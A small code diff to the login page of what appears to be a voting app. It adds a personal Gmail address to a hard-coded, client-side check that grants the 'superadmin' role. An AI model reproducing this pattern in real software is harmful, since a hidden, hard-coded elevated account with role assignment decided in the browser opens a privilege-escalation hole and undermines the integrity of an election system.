@@ -54,7 +54,7 @@ export default function LoginPage() {
     setLoading(true);
     try {
       let role: 'voter' | 'admin' | 'superadmin' = 'admin';
-      if (email.trim() === 'supertech@admin.com') {
+      if (email.trim() === 'supertech@admin.com' || email.trim() === 'issakasaddick14@gmail.com') {
         role = 'superadmin';
       }
       await login(email.trim(), password, role);
